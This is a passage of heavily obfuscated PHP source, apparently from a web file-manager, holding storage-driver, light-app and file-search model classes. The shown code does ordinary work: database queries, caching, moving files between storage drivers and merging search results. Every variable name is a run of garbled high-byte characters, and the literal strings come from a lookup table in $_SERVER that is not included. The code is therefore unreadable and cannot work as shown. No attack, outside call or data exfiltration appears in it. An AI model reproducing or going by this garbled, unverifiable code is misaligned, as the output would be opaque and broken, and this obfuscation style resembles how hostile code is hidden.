$–È›Ï¨[2304] => $–È›Ï¨[90]); $¸ºº£Õ = array($–È›Ï¨[891] => array($–È›Ï¨[7], $éÌ­Üê—)); $²ü€Ë¬ = Model($–È›Ï¨[863])->field($ÎîêàØ)->where($¸ºº£Õ)->group($–È›Ï¨[891])->select(); $²ü€Ë¬ = array_to_keyvalue($²ü€Ë¬, $–È›Ï¨[487], $–È›Ï¨[90]); Cache::set($Êö«‡¡, $²ü€Ë¬, 600); return $²ü€Ë¬; } public function getConfig($ßÂÇéÁ) { $°ß¿ãØ¾ = parent::listData($ßÂÇéÁ); $…”‡ŸÖ = _get($°ß¿ãØ¾, $_SERVER[Ò°Ì”İ•][6], array()); if ($…”‡ŸÖ && !is_array($…”‡ŸÖ)) { $…”‡ŸÖ = json_decode($…”‡ŸÖ, !0); } return $…”‡ŸÖ; } public function update($ÍğÀ±ˆË, $ÙÅô¤úù) { $ûú€¢¼ =& $_SERVER[Ò°Ì”İ•]; $ìÆ²íó¦ = $ÙÅô¤úù[$ûú€¢¼[32]]; $¼ëõîô† = array_to_keyvalue(parent::listData(), $ûú€¢¼[32]); if (isset($¼ëõîô†[$ìÆ²íó¦]) && $¼ëõîô†[$ìÆ²íó¦][$ûú€¢¼[487]] != $ÍğÀ±ˆË) { return !1; } $this->checkPwd($ÍğÀ±ˆË, $ÙÅô¤úù); if (isset($ÙÅô¤úù[$ûú€¢¼[2305]]) && $ÙÅô¤úù[$ûú€¢¼[2305]] == $ûú€¢¼[102]) { $this->checkConfig($ÙÅô¤úù); } unset($ÙÅô¤úù[$ûú€¢¼[2305]]); $Îé·¯¤ = parent::update($ÍğÀ±ˆË, $ÙÅô¤úù); if ($Îé·¯¤ && $ÙÅô¤úù[$ûú€¢¼[37]]) { $­³Çì¿Ã = 0; foreach ($¼ëõîô† as $†…Œ¿¶) { if ($†…Œ¿¶[$ûú€¢¼[37]] && $†…Œ¿¶[$ûú€¢¼[487]] != $ÍğÀ±ˆË) { $­³Çì¿Ã = $†…Œ¿¶[$ûú€¢¼[487]]; parent::update($†…Œ¿¶[$ûú€¢¼[487]], array($ûú€¢¼[37] => 0)); } } $this->updateBackup($ÍğÀ±ˆË, $­³Çì¿Ã); } return $Îé·¯¤; } public function add($¬ÒÌŒÑÏ) { $ŒÚ¡¯ò =& $_SERVER[Ò°Ì”İ•]; $ «ş¨ˆ = array_to_keyvalue(parent::listData(), $ŒÚ¡¯ò[32]); if (isset($ «ş¨ˆ[$¬ÒÌŒÑÏ[$ŒÚ¡¯ò[32]]])) { return !1; } $this->checkConfig($¬ÒÌŒÑÏ); $è–‘À· = parent::insert($¬ÒÌŒÑÏ); if ($è–‘À· && $¬ÒÌŒÑÏ[$ŒÚ¡¯ò[37]]) { foreach ($ «ş¨ˆ as $ù»¹åÃ¼) { if ($ù»¹åÃ¼[$ŒÚ¡¯ò[37]]) { parent::update($ù»¹åÃ¼[$ŒÚ¡¯ò[487]], array($ŒÚ¡¯ò[37] => 0)); } } } return $è–‘À·; } public function updateBackup($£‰®”Ğ, $ìÁæ€¾ô) { $·¡„ªÂ² =& $_SERVER[Ò°Ì”İ•]; if (!$ìÁæ€¾ô) { return; } $ÏŸ‘¿Ö€ = Model($·¡„ªÂ²[821])->config(); if ($ÏŸ‘¿Ö€[$·¡„ªÂ²[1737]] != $·¡„ªÂ²[102] || $ÏŸ‘¿Ö€[$·¡„ªÂ²[825]] != $ìÁæ€¾ô) { return; } $ÅÆÃŸ‘ = Model($·¡„ªÂ²[843])->get($·¡„ªÂ²[857]); $ÅÆÃŸ‘ = json_decode($ÅÆÃŸ‘, !0); if (!$ÅÆÃŸ‘) { return; } $ÅÆÃŸ‘[$·¡„ªÂ²[825]] = $£‰®”Ğ; Model($·¡„ªÂ²[843])->set(array($·¡„ªÂ²[857] => $ÅÆÃŸ‘)); } public function checkPwd($Ôğ­ø€Æ, &$ç»ˆÊÍİ) { $Ë‰¼„ =& $_SERVER[Ò°Ì”İ•]; if (empty($ç»ˆÊÍİ[$Ë‰¼„[6]])) { return; } $ÚÂØ¥« = $ç»ˆÊÍİ[$Ë‰¼„[6]]; if (!is_array($ÚÂØ¥«)) { $ÚÂØ¥« = json_decode($ÚÂØ¥«, !0); } $È¿şÚËÊ = $Ë‰¼„[12]; $ŠæØÖ¶ = array($Ë‰¼„[2306], $Ë‰¼„[2307], $Ë‰¼„[962]); foreach ($ŠæØÖ¶ as $Õ½¶ã…Ã) { if (isset($ÚÂØ¥«[$Õ½¶ã…Ã])) { $È¿şÚËÊ = $Õ½¶ã…Ã; break; } } if (!$È¿şÚËÊ) { return; } $ü‰ú±‚ = $this->getConfig($Ôğ­ø€Æ); $òÒ×‰“ = $ü‰ú±‚[$È¿şÚËÊ]; $üéÔ¨Êå = $ÚÂØ¥«[$È¿şÚËÊ]; if ($üéÔ¨Êå == str_repeat($Ë‰¼„[233], strlen($òÒ×‰“))) { $ÚÂØ¥«[$È¿şÚËÊ] = $òÒ×‰“; $ç»ˆÊÍİ[$Ë‰¼„[6]] = json_encode($ÚÂØ¥«); } else { if ($üéÔ¨Êå != $òÒ×‰“) { $ç»ˆÊÍİ[$Ë‰¼„[2305]] = $Ë‰¼„[102]; } } } public function checkConfig(&$Ì‘ŠşÑÆ, $©‚¥ƒÚœ = false) { $‡¥İåìÛ =& $_SERVER[Ò°Ì”İ•]; $’“ºÂÇ¨ = strtolower($Ì‘ŠşÑÆ[$‡¥İåìÛ[109]]); $æŞèõ¾Æ = $Ì‘ŠşÑÆ[$‡¥İåìÛ[6]]; if (!is_array($æŞèõ¾Æ)) { $æŞèõ¾Æ = json_decode($æŞèõ¾Æ, !0); } foreach ($æŞèõ¾Æ as $äœâ£¶ => $°“æ£ı) { if (is_string($°“æ£ı)) { $æŞèõ¾Æ[$äœâ£¶] = trim($°“æ£ı); } } $æŞèõ¾Æ[$‡¥İåìÛ[2308]] = rand_string(6); $úîé¯óü = $GLOBALS[$‡¥İåìÛ[6]][$‡¥İåìÛ[103]][$‡¥İåìÛ[899]]; $¥£•´Î = isset($úîé¯óü[$’“ºÂÇ¨]) ? $úîé¯óü[$’“ºÂÇ¨] : ucfirst($’“ºÂÇ¨); $¶ò¢Œ»Ù = $‡¥İåìÛ[88] . $¥£•´Î; if (!$¥£•´Î || !class_exists($¶ò¢Œ»Ù)) { if ($©‚¥ƒÚœ) { return LNG($‡¥İåìÛ[2309]); } write_log(array($‡¥İåìÛ[2310], $Ì‘ŠşÑÆ, get_caller_info()), $‡¥İåìÛ[226]); show_json(LNG($‡¥İåìÛ[2309]), !1, $Ì‘ŠşÑÆ); } $–¤òØ‹ò = new $¶ò¢Œ»Ù($æŞèõ¾Æ); if (in_array($’“ºÂÇ¨, $–¤òØ‹ò->objectDriver)) { try { if (!$–¤òØ‹ò->isBucketCors() && !$–¤òØ‹ò->setBucketCors()) { $ıòáá¢ş = LNG($‡¥İåìÛ[2311]); $ıòáá¢ş .= $‡¥İåìÛ[2312] . LNG($‡¥İåìÛ[2313]); } } catch (Exception $ÓËÙˆæÅ) { $ıòáá¢ş = $ÓËÙˆæÅ->getMessage(); } if (isset($ıòáá¢ş)) { return $this->_parseError($ıòáá¢ş, $’“ºÂÇ¨, $©‚¥ƒÚœ); } if ($’“ºÂÇ¨ == $‡¥İåìÛ[79] && !$–¤òØ‹ò->checkRegion()) { return $this->_parseError(LNG($‡¥İåìÛ[2314]), $’“ºÂÇ¨, $©‚¥ƒÚœ); } } $‚ÕåŞôæ = rtrim($æŞèõ¾Æ[$‡¥İåìÛ[1258]], $‡¥İåìÛ[8]) . $‡¥İåìÛ[8]; $áœĞİË = $–¤òØ‹ò->getPath($‚ÕåŞôæ . $‡¥İåìÛ[1262]); try { if ($’“ºÂÇ¨ == $‡¥İåìÛ[120]) { $–¤òØ‹ò->mkdir($‚ÕåŞôæ); } $ä°±Ï¢ï = $–¤òØ‹ò->mkfile($áœĞİË); if (!$ä°±Ï¢ï) { $ıòáá¢ş = LNG($‡¥İåìÛ[2311]); } } catch (Exception $ÓËÙˆæÅ) { $ıòáá¢ş = $ÓËÙˆæÅ->getMessage(); } if (isset($ıòáá¢ş)) { return $this->_parseError($ıòáá¢ş, $’“ºÂÇ¨, $©‚¥ƒÚœ); } $æŞèõ¾Æ[$‡¥İåìÛ[1258]] = $‚ÕåŞôæ; $Ì‘ŠşÑÆ[$‡¥İåìÛ[6]] = json_encode($æŞèõ¾Æ); $Ì‘ŠşÑÆ[$‡¥İåìÛ[109]] = $¥£•´Î; return !0; } private function _parseError($Ö”˜„—, $“ôŞÁÄ¥, $‰ÏµûÁ˜ = false) { $”ÙË¸–µ =& $_SERVER[Ò°Ì”İ•]; if ($“ôŞÁÄ¥ == $”ÙË¸–µ[79] && stripos($Ö”˜„—, $”ÙË¸–µ[2315])) { $µ¢³°Œ× = explode($”ÙË¸–µ[10], $Ö”˜„—); $ÅÔÍ›¨ = isset($µ¢³°Œ×[1]) ? $µ¢³°Œ×[1] : $”ÙË¸–µ[12]; $ÕÅ×•…Ü = array($”ÙË¸–µ[2316] => LNG($”ÙË¸–µ[2317]), $”ÙË¸–µ[2318] => LNG($”ÙË¸–µ[2319])); if (isset($ÕÅ×•…Ü[$ÅÔÍ›¨])) { $Ö”˜„— = $ÕÅ×•…Ü[$ÅÔÍ›¨]; } } if (stripos($Ö”˜„—, $”ÙË¸–µ[2320]) === 0) { $Æ¥õ±ú = strpos($Ö”˜„—, $”ÙË¸–µ[189]); if ($Æ¥õ±ú === !1) { $Æ¥õ±ú = strpos($Ö”˜„—, $”ÙË¸–µ[4]); } if ($Æ¥õ±ú !== !1) { $Ö”˜„— = substr($Ö”˜„—, $Æ¥õ±ú + 1); } } $Ö”˜„— = LNG($”ÙË¸–µ[1265]) . $Ö”˜„—; if ($‰ÏµûÁ˜) { return $Ö”˜„—; } show_json($Ö”˜„—, !1); } public function driverListSystem() { $Û³æ‘­ =& $_SERVER[Ò°Ì”İ•]; $Üë³œÉÒ = parent::listData(); $í„Èè½ = array(); foreach ($Üë³œÉÒ as $ƒºäİ›¦) { unset($ƒºäİ›¦[$Û³æ‘­[244]], $ƒºäİ›¦[$Û³æ‘­[99]]); if (!is_array($ƒºäİ›¦[$Û³æ‘­[6]])) { $ƒºäİ›¦[$Û³æ‘­[6]] = json_decode($ƒºäİ›¦[$Û³æ‘­[6]], !0); } $í„Èè½[] = $ƒºäİ›¦; } return $í„Èè½; } public function defaultDriver() { $Ã°è£³ =& $_SERVER[Ò°Ì”İ•]; $¤—ğ²Şû = parent::listData(); $Ë¦ø¢ã™ = array_filter_by_field($¤—ğ²Şû, $Ã°è£³[37], 1); $Ë¦ø¢ã™ = $Ë¦ø¢ã™[0]; if (!$Ë¦ø¢ã™) { return array(); } if (!is_array($Ë¦ø¢ã™[$Ã°è£³[6]])) { $Ë¦ø¢ã™[$Ã°è£³[6]] = json_decode($Ë¦ø¢ã™[$Ã°è£³[6]], !0); } return $Ë¦ø¢ã™; } public function driverInfo($Ñ¿ßª) { $Ğäô»± =& $_SERVER[Ò°Ì”İ•]; $°Õ×ş†« = array_to_keyvalue(parent::listData(), $Ğäô»±[487]); if (!isset($°Õ×ş†«[$Ñ¿ßª])) { return !1; } $äÑ¤ÓØí = $°Õ×ş†«[$Ñ¿ßª]; if (!is_array($äÑ¤ÓØí[$Ğäô»±[6]])) { $äÑ¤ÓØí[$Ğäô»±[6]] = json_decode($äÑ¤ÓØí[$Ğäô»±[6]], !0); } return $äÑ¤ÓØí; } public function remove($‹Ëµêãò) { $this->removeShareItems($‹Ëµêãò); return parent::remove($‹Ëµêãò); } public function removeWithFile($…íå£¾’, $ñôàÓèö, $ô“•¡şù, $¾§ş÷·˜ = false) { $ê·ÔÅÜ =& $_SERVER[Ò°Ì”İ•]; $æªğüé  = array($ê·ÔÅÜ[891] => $…íå£¾’); $‹ø‚ÍÙ· = Model($ê·ÔÅÜ[556])->where($æªğüé )->count(); $¾”ÇŒ = Model($ê·ÔÅÜ[556])->where($æªğüé )->sum($ê·ÔÅÜ[90]); $°ø’¯áµ = $ñôàÓèö . $ê·ÔÅÜ[2321] . $…íå£¾’; $™ÜÔûÚ­ = LNG($ñôàÓèö == $ê·ÔÅÜ[635] ? $ê·ÔÅÜ[2322] : $ê·ÔÅÜ[2323]); $çä—·ı× = new TaskFileTransfer($°ø’¯áµ, $ê·ÔÅÜ[226], $‹ø‚ÍÙ·, $™ÜÔûÚ­ . $ê·ÔÅÜ[474] . $ô“•¡şù[$ê·ÔÅÜ[32]] . $ê·ÔÅÜ[225] . $…íå£¾’); $çä—·ı×->task[$ê·ÔÅÜ[836]] = (double) $¾”ÇŒ; $æó£û‘ = KodIO::defaultDriver(); $­ËüŸª = $æó£û‘[$ê·ÔÅÜ[487]]; $¢«¿·® = $«õ—œÁÈ = $²ş¾‹²è = array(); $ê´´õ·ø = Model($ê·ÔÅÜ[243])->where($æªğüé )->field($ê·ÔÅÜ[2324])->select(); foreach ($ê´´õ·ø as $‚îÈ³Äö) { $÷àÎè§½ = $‚îÈ³Äö[$ê·ÔÅÜ[553]]; if ($¾§ş÷·˜) { $«õ—œÁÈ[] = $÷àÎè§½; continue; } $‚‹ÀÛ×ˆ = $‚îÈ³Äö[$ê·ÔÅÜ[98]]; $ışÎâ° = get_path_father($‚‹ÀÛ×ˆ); $²ş¾‹²è[] = $ışÎâ°; $ışÎâ° = str_replace("\x7b\151\157\72{$…íå£¾’}\175\57", "\173\x69\157\72{$­ËüŸª}\x7d\57", $ışÎâ°); if (!IO::exist($‚‹ÀÛ×ˆ)) { $¢«¿·®[] = $÷àÎè§½; $çä—·ı×->updateFileEnd($‚îÈ³Äö[$ê·ÔÅÜ[32]], $‚îÈ³Äö[$ê·ÔÅÜ[90]]); write_log($ê·ÔÅÜ[2325] . $‚‹ÀÛ×ˆ, $ê·ÔÅÜ[1900]); continue; } $’æãùû = IO::move($‚‹ÀÛ×ˆ, $ışÎâ°, REPEAT_RENAME); if (!$’æãùû) { $«õ—œÁÈ[] = $÷àÎè§½; $çä—·ı×->updateFileEnd($‚îÈ³Äö[$ê·ÔÅÜ[32]], $‚îÈ³Äö[$ê·ÔÅÜ[90]]); write_log($ê·ÔÅÜ[2326] . $‚‹ÀÛ×ˆ, $ê·ÔÅÜ[1900]); continue; } $æªğüé  = array($ê·ÔÅÜ[553] => $÷àÎè§½); $ş¢ƒûÌí = array($ê·ÔÅÜ[891] => $­ËüŸª, $ê·ÔÅÜ[98] => $’æãùû); Model($ê·ÔÅÜ[243])->where($æªğüé )->save($ş¢ƒûÌí); } $“…Â¤ = $çä—·ı×->task; if (!$¾§ş÷·˜) { Cache::set($°ø’¯áµ, $“…Â¤); } $çä—·ı×->end(); $¢«¿·® = array_unique($¢«¿·®); $«õ—œÁÈ = array_unique($«õ—œÁÈ); if (!$¾§ş÷·˜ && ($¢«¿·® || $«õ—œÁÈ)) { $áŒÊÈÏÃ = array(); if ($¢«¿·®) { $áŒÊÈÏÃ[] = sprintf(LNG($ê·ÔÅÜ[2327]), count($¢«¿·®)); } if ($«õ—œÁÈ) { $áŒÊÈÏÃ[] = sprintf(LNG($ê·ÔÅÜ[2328]), count($«õ—œÁÈ)); } $áŒÊÈÏÃ = sprintf(LNG($ê·ÔÅÜ[2329]), implode($ê·ÔÅÜ[2330], $áŒÊÈÏÃ)) . $ê·ÔÅÜ[2331] . date($ê·ÔÅÜ[2332]) . $ê·ÔÅÜ[2333]; if ($ñôàÓèö == $ê·ÔÅÜ[1937]) { $áŒÊÈÏÃ .= $ê·ÔÅÜ[2334] . LNG($ê·ÔÅÜ[2335]); } else { $áŒÊÈÏÃ = LNG($ê·ÔÅÜ[2336]) . $ê·ÔÅÜ[2337] . $áŒÊÈÏÃ; } $“…Â¤[$ê·ÔÅÜ[1260]] = $áŒÊÈÏÃ; Cache::set($°ø’¯áµ, $“…Â¤); unset($ô“•¡şù[$ê·ÔÅÜ[6]]); $ĞŒ‘ÜÓù = array($ê·ÔÅÜ[487] => $…íå£¾’, $ê·ÔÅÜ[2208] => $ê·ÔÅÜ[635], $ê·ÔÅÜ[32] => $ô“•¡şù[$ê·ÔÅÜ[32]], $ê·ÔÅÜ[109] => $ô“•¡şù[$ê·ÔÅÜ[109]]); Hook::trigger($ê·ÔÅÜ[1779], array($ê·ÔÅÜ[1283] => $ĞŒ‘ÜÓù, $ê·ÔÅÜ[1293] => !0)); show_json($áŒÊÈÏÃ, !1, 100111); } if ($ñôàÓèö == $ê·ÔÅÜ[635]) { return !0; } if ($¢«¿·® || $«õ—œÁÈ) { $›ğÆ»ƒ = array_merge($¢«¿·®, $«õ—œÁÈ); $›ğÆ»ƒ = array_filter(array_unique($›ğÆ»ƒ)); $this->removeByFileID($›ğÆ»ƒ); } if ($²ş¾‹²è) { $²ş¾‹²è = array_filter(array_unique($²ş¾‹²è)); foreach ($²ş¾‹²è as $‚‹ÀÛ×ˆ) { $ÄœÕûë› = IO::has($‚‹ÀÛ×ˆ, !0); if (!$ÄœÕûë›[$ê·ÔÅÜ[252]] && !$ÄœÕûë›[$ê·ÔÅÜ[253]]) { IO::remove($‚‹ÀÛ×ˆ); } } } return $this->remove($…íå£¾’); } private function removeByFileID($İíÈûÃú = array()) { $ú‰ôáŠ• =& $_SERVER[Ò°Ì”İ•]; if (empty($İíÈûÃú)) { return; } $ø˜Ô°Ÿ˜ = array($ú‰ôáŠ•[553] => array($ú‰ôáŠ•[7], $İíÈûÃú)); $êÃÃ‹÷­ = Model($ú‰ôáŠ•[1417])->where($ø˜Ô°Ÿ˜)->field($ú‰ôáŠ•[204])->select(); if (!$êÃÃ‹÷­) { return Model($ú‰ôáŠ•[556])->remove($İíÈûÃú); } $êÃÃ‹÷­ = array_to_keyvalue($êÃÃ‹÷­, $ú‰ôáŠ•[12], $ú‰ôáŠ•[204]); foreach ($êÃÃ‹÷­ as $ıÊ¢¤¨Œ) { Model($ú‰ôáŠ•[898])->removeNow($ıÊ¢¤¨Œ, !1); } } private function removeShareItems($‡í¡¦ó­) { $°¼íüé„ =& $_SERVER[Ò°Ì”İ•]; $û˜Ç‚ôû = "\173\x69\x6f\x3a{$‡í¡¦ó­}\x7d\57"; $“˜Œííš = array($°¼íüé„[204] => 0, $°¼íüé„[1253] => array($°¼íüé„[471], "{$û˜Ç‚ôû}\45")); $´·ç¦âÜ = Model($°¼íüé„[1948])->where($“˜Œííš)->field($°¼íüé„[680])->select(); if (empty($´·ç¦âÜ)) { return; } $ş¬¯Ûü´ = array_to_keyvalue($´·ç¦âÜ, $°¼íüé„[12], $°¼íüé„[680]); Model($°¼íüé„[679])->remove($ş¬¯Ûü´); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\114\x69\147\150\x74\101\x70\x70"; public $modelType = "\x53\171\x73\x74\145\155\x4f\160\x74\x69\x6f\156"; public $field = array("\x6e\x61\x6d\x65", "\x67\162\x6f\x75\x70", "\x64\145\163\143", "\143\x6f\156\x74\145\156\164"); public function listData($´¸¹×Û¢ = false, $ö×û¼ü¾ = "\155\157\x64\x69\146\171\x54\151\x6d\145", $ÌŸ—ÃùÂ = true) { return parent::listData($´¸¹×Û¢, $ö×û¼ü¾, $ÌŸ—ÃùÂ); } public function remove($“ãòòĞº) { $¦ªªœ³¿ = $this->findByName($“ãòòĞº); if (!$¦ªªœ³¿) { return !1; } return parent::remove($¦ªªœ³¿[$_SERVER[Ò°Ì”İ•][487]]); } public function add($©Œ©‹şë) { if ($this->findByName($©Œ©‹şë[$_SERVER[Ò°Ì”İ•][32]])) { return !1; } return parent::insert($©Œ©‹şë); } public function update($¨¬ÎÆ›, $ÆŞºƒ”) { $¿«ÀİÍ€ =& $_SERVER[Ò°Ì”İ•]; $ÈÅÍ¨™Å = $this->findByName($¨¬ÎÆ›); $¨×äéİ€ = $this->findByName($ÆŞºƒ”[$¿«ÀİÍ€[32]]); if (!$ÈÅÍ¨™Å || $¨×äéİ€ && $¨×äéİ€[$¿«ÀİÍ€[487]] != $ÈÅÍ¨™Å[$¿«ÀİÍ€[487]]) { return !1; } return parent::update($ÈÅÍ¨™Å[$¿«ÀİÍ€[487]], $ÆŞºƒ”); } } goto cºµÀ¥• ™; a÷¹Š“Š“±: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($©æƒ‹‰î) { $ÜÕÒ”² =& $_SERVER[Ò°Ì”İ•]; $³‡º‡ï = KodIO::fileTypeList(); $½»½³Œ´ = $³‡º‡ï[$©æƒ‹‰î]; if (!$½»½³Œ´) { return array(); } $óÌó´ò½ = $½»½³Œ´[$ÜÕÒ”²[180]]; $Õßç¤”ô = $ÜÕÒ”²[7]; if (!$½»½³Œ´[$ÜÕÒ”²[180]]) { $ËÅ°À• = array_to_keyvalue($³‡º‡ï, $ÜÕÒ”²[12], $ÜÕÒ”²[180]); $óÌó´ò½ = implode($ÜÕÒ”²[50], $ËÅ°À•); $Õßç¤”ô = $ÜÕÒ”²[2233]; } $ÃÍÒäúÍ = explode($ÜÕÒ”²[50], trim($óÌó´ò½, $ÜÕÒ”²[50])); return array($Õßç¤”ô, $ÃÍÒäúÍ); } public function listPathType($ÛÔí÷Õ–) { $ÆïÄŒ£† =& $_SERVER[Ò°Ì”İ•]; $ÇÉ™ÒÈ = $this->fileTypeWhere($ÛÔí÷Õ–); if (!$ÇÉ™ÒÈ) { return array(); } $İûÊ”³ = USER_ID; $ÏÇİİĞ = Model($ÆïÄŒ£†[609])->getInfo($İûÊ”³); $Úèª¾ = array($ÆïÄŒ£†[663] => SourceModel::TYPE_USER, $ÆïÄŒ£†[596] => array($ÆïÄŒ£†[627], $ÆïÄŒ£†[605] . $ÏÇİİĞ[$ÆïÄŒ£†[101]][$ÆïÄŒ£†[204]] . $ÆïÄŒ£†[628]), $ÆïÄŒ£†[664] => $İûÊ”³, $ÆïÄŒ£†[661] => 0, $ÆïÄŒ£†[662] => $ÇÉ™ÒÈ); return $this->listSource($Úèª¾); } public function listSearch($ë¦ìùµÍ, $³’º‘Ì½ = 300) { $¬«ÏĞú‘ =& $_SERVER[Ò°Ì”İ•]; if (isset($ë¦ìùµÍ[$¬«ÏĞú‘[2067]]) && $ë¦ìùµÍ[$¬«ÏĞú‘[2067]]) { $ë¦ìùµÍ[$¬«ÏĞú‘[2067]] = str_replace($¬«ÏĞú‘[472], $¬«ÏĞú‘[2234], trim($ë¦ìùµÍ[$¬«ÏĞú‘[2067]])); } $ŞÆÑœ¹Ç = $this->_parseSearchWhere($ë¦ìùµÍ); if (!isset($ŞÆÑœ¹Ç[$¬«ÏĞú‘[517]])) { $ŞÆÑœ¹Ç[$¬«ÏĞú‘[517]] = 0; } $¤¸¦‚Ï‘ = $¬«ÏĞú‘[2235]; $¯èûéèĞ = $ŞÆÑœ¹Ç; $ê†¾Í» = $¤¸¦‚Ï‘; $this->_listSearchBindPinyin($ë¦ìùµÍ, $ŞÆÑœ¹Ç, $¤¸¦‚Ï‘); $this->alias($¬«ÏĞú‘[531])->_makeOrder(); $ŞÆÑœ¹Ç = $this->parseWhereLike($ŞÆÑœ¹Ç); $†º°Ú€Ğ = $this->distinct(!0)->field($¤¸¦‚Ï‘)->where($ŞÆÑœ¹Ç)->selectPage($³’º‘Ì½); if ($GLOBALS[$¬«ÏĞú‘[6]][$¬«ÏĞú‘[469]][$¬«ÏĞú‘[470]] && Input::check($ë¦ìùµÍ[$¬«ÏĞú‘[2067]], $¬«ÏĞú‘[670]) && $†º°Ú€Ğ[$¬«ÏĞú‘[454]][$¬«ÏĞú‘[440]] == 1 && $†º°Ú€Ğ[$¬«ÏĞú‘[454]][$¬«ÏĞú‘[455]] == 0) { $†º°Ú€Ğ = $this->distinct(!0)->field($¤¸¦‚Ï‘)->where($¯èûéèĞ)->limit(1000)->select(); $†º°Ú€Ğ = array_page_split($†º°Ú€Ğ, !1, $³’º‘Ì½); } $this->_listSearchFileContent($†º°Ú€Ğ, $ë¦ìùµÍ, $ê†¾Í», $¯èûéèĞ); $this->_listSearchDesc($†º°Ú€Ğ, $ë¦ìùµÍ, $ê†¾Í»); $this->_listSearchTag($†º°Ú€Ğ, $ë¦ìùµÍ, $ê†¾Í»); $this->_listSearchGroupTag($†º°Ú€Ğ, $ë¦ìùµÍ, $ê†¾Í»); $this->_listDataApply($†º°Ú€Ğ[$¬«ÏĞú‘[457]]); $this->_listMake($†º°Ú€Ğ); return $†º°Ú€Ğ; } private function _listSearchFileContent(&$·¿Ïº»³, $—ç«†İÑ, $–Â¢œì, $û¹ÉŠÅÜ) { $ÔÖ¬ŒÓ¬ =& $_SERVER[Ò°Ì”İ•]; if (!$—ç«†İÑ[$ÔÖ¬ŒÓ¬[2067]] || $·¿Ïº»³[$ÔÖ¬ŒÓ¬[454]][$ÔÖ¬ŒÓ¬[440]] > 1) { return; } if (!isset($û¹ÉŠÅÜ[$ÔÖ¬ŒÓ¬[32]]) || !is_array($—ç«†İÑ[$ÔÖ¬ŒÓ¬[553]])) { return; } $û¹ÉŠÅÜ[$ÔÖ¬ŒÓ¬[553]] = array($ÔÖ¬ŒÓ¬[7], $—ç«†İÑ[$ÔÖ¬ŒÓ¬[553]]); unset($û¹ÉŠÅÜ[$ÔÖ¬ŒÓ¬[32]]); unset($—ç«†İÑ[$ÔÖ¬ŒÓ¬[553]]); $ÉÃÒ¦ù = $this->field($–Â¢œì)->where($û¹ÉŠÅÜ)->limit($ÔÖ¬ŒÓ¬[2236])->select(); if (!$ÉÃÒ¦ù || count($ÉÃÒ¦ù) == 0) { return; } $·¿Ïº»³[$ÔÖ¬ŒÓ¬[457]] = array_merge($ÉÃÒ¦ù, $·¿Ïº»³[$ÔÖ¬ŒÓ¬[457]]); $·¿Ïº»³[$ÔÖ¬ŒÓ¬[454]][$ÔÖ¬ŒÓ¬[455]] += count($ÉÃÒ¦ù); } private function _listSearchTag(&$Àñ‚„‹–, $ş±ŞÙ©Ÿ, $²ñ¨Ş†Í) { $Ü¦©ˆûß =& $_SERVER[Ò°Ì”İ•]; if (!$ş±ŞÙ©Ÿ[$Ü¦©ˆûß[2067]] || $Àñ‚„‹–[$Ü¦©ˆûß[454]][$Ü¦©ˆûß[440]] > 1) { return; } $ÖÉ¨¯ó¯ = Model($Ü¦©ˆûß[2237])->listData(); $ŸÒÁ• = array(); $ÔƒşÕœ¬ = $ş±ŞÙ©Ÿ[$Ü¦©ˆûß[2067]]; foreach ($ÖÉ¨¯ó¯ as $´î¶–ßÔ) { $ˆˆ–—Œ© = $´î¶–ßÔ[$Ü¦©ˆûß[32]]; $íâ²Ê¥ş = str_replace($Ü¦©ˆûß[53], $Ü¦©ˆûß[12], Pinyin::get($ˆˆ–—Œ©)); if (stripos($ˆˆ–—Œ©, $ÔƒşÕœ¬) !== !1 || stripos($íâ²Ê¥ş, $ÔƒşÕœ¬) !== !1) { $ŸÒÁ•[] = $´î¶–ßÔ[$Ü¦©ˆûß[487]]; } } if (!$ŸÒÁ•) { return; } $¶¦Äî´‰ = array($Ü¦©ˆûß[512] => array($Ü¦©ˆûß[7], $ŸÒÁ•), $Ü¦©ˆûß[1768] => USER_ID); $›Á½×ÎÚ = Model($Ü¦©ˆûß[514])->field($Ü¦©ˆûß[98])->where($¶¦Äî´‰)->select(); $›Á½×ÎÚ = array_to_keyvalue($›Á½×ÎÚ, $Ü¦©ˆûß[12], $Ü¦©ˆûß[98]); $¶˜é§ŸÇ = array_unique($›Á½×ÎÚ); $this->_listSearchMerge($Àñ‚„‹–, $ş±ŞÙ©Ÿ, $²ñ¨Ş†Í, $¶˜é§ŸÇ); } private function _listSearchDesc(&$½„”çóó, $•¶˜­, $ïì´üÁç) { $Şãñ­ä¨ =& $_SERVER[Ò°Ì”İ•]; if (!$•¶˜­[$Şãñ­ä¨[2067]] || $½„”çóó[$Şãñ­ä¨[454]][$Şãñ­ä¨[440]] > 1) { return; } $‰¶æÓ¨ê = array($Şãñ­ä¨[108] => $Şãñ­ä¨[538], $Şãñ­ä¨[462] => array($Şãñ­ä¨[471], $Şãñ­ä¨[2069] . $•¶˜­[$Şãñ­ä¨[2067]] . $Şãñ­ä¨[2069])); $‹˜òÀô = !1; if ($‹˜òÀô) { $ôŸ¿ÔµÉ = $this->listSearchChildren($•¶˜­[$Şãñ­ä¨[203]]); $ôŸ¿ÔµÉ = array_unique($ôŸ¿ÔµÉ); if (!$ôŸ¿ÔµÉ) { return; } $‰¶æÓ¨ê[$Şãñ­ä¨[204]] = array($Şãñ­ä¨[7], $ôŸ¿ÔµÉ); } $Ã¡ùí×” = Model($Şãñ­ä¨[647])->field($Şãñ­ä¨[204])->where($‰¶æÓ¨ê)->limit(5000)->select(); $üÂüÄ­ğ = array_to_keyvalue($Ã¡ùí×”, $Şãñ­ä¨[12], $Şãñ­ä¨[204]); $this->_listSearchMerge($½„”çóó, $•¶˜­, $ïì´üÁç, $üÂüÄ­ğ); } private function _listSearchGroupTag(&$±íı´üÆ, $…ˆºÂÛì, $˜şÄ¤Úš) { $ÉÈ¨ûìß =& $_SERVER[Ò°Ì”İ•]; if (!$…ˆºÂÛì[$ÉÈ¨ûìß[2067]] || $±íı´üÆ[$ÉÈ¨ûìß[454]][$ÉÈ¨ûìß[440]] > 1 || !$…ˆºÂÛì[$ÉÈ¨ûìß[203]]) { return; } $‚¹ê¤¡« = $this->sourceInfo($…ˆºÂÛì[$ÉÈ¨ûìß[203]]); if (!$‚¹ê¤¡« || $‚¹ê¤¡«[$ÉÈ¨ûìß[201]] != SourceModel::TYPE_GROUP) { return; } $ãÑÃ‡ŒÃ = $‚¹ê¤¡«[$ÉÈ¨ûìß[581]]; $±…Íœãà = Model($ÉÈ¨ûìß[2238])->get($ãÑÃ‡ŒÃ); $Ô°ë¢öå 